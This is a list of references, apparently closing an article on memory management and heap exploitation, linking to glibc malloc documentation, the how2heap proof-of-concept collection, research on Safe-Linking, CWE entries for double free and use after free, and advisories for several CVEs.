- GeeksforGeeks — [Memory Management in Operating System](https://www.geeksforgeeks.org/operating-systems/memory-management-in-operating-system/)
- how2heap (shellphish) — [Bộ PoC các kỹ thuật heap exploitation](https://github.com/shellphish/how2heap)
- glibc Wiki — [MallocInternals](https://sourceware.org/glibc/wiki/MallocInternals)
- Check Point Research — [Safe-Linking: eliminating a 20-year-old malloc() exploit primitive](https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/)
- corgi.rip — [Leakless Heap Exploitation — The House of Water](https://corgi.rip/posts/leakless_heap_1/)
- MITRE — [CWE-415: Double Free](https://cwe.mitre.org/data/definitions/415.html), [CWE-416: Use After Free](https://cwe.mitre.org/data/definitions/416.html)
- NVD — [CVE-2026-33824](https://nvd.nist.gov/vuln/detail/CVE-2026-33824), [CVE-2026-23918](https://nvd.nist.gov/vuln/detail/CVE-2026-23918), [CVE-2025-62215](https://nvd.nist.gov/vuln/detail/CVE-2025-62215)
- Microsoft MSRC — [CVE-2026-33824](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-33824)
- Zero Day Initiative (TrendAI) — [CVE-2026-33824: Remote Code Execution in Windows IKEv2](https://www.thezdi.com/blog/2026/4/22/cve-2026-33824-remote-code-execution-in-windows-ikev2)
- Apache Software Foundation — [Apache HTTP Server 2.4 vulnerabilities](https://httpd.apache.org/security/vulnerabilities_24.html)
- Rescana — [Phân tích CVE-2026-23918](https://www.rescana.com/post/critical-apache-http-server-2-4-66-vulnerability-cve-2026-23918-http-2-mod-http2-double-free-enables-dos-and-remote-code)
- CISA — [Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- glibc - https://elixir.bootlin.com/glibc/glibc-2.26/